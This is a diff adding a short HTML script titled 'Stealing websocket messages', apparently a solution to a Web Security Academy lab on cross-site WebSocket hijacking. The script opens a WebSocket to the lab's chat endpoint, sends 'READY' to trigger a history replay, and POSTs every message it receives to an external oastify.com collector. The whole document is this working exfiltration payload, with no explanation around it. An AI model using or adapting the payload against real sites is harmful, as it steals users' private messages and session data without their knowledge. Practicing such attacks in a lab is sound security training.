@@ -1,0 +1,11 @@
+Stealing websocket messages
+<script>
+    var ws = new WebSocket('wss://0a7b001903082c7fc083a58800b20087.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://yjlbyto4s3j15c06b7i6yj6ev51wpqdf.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+
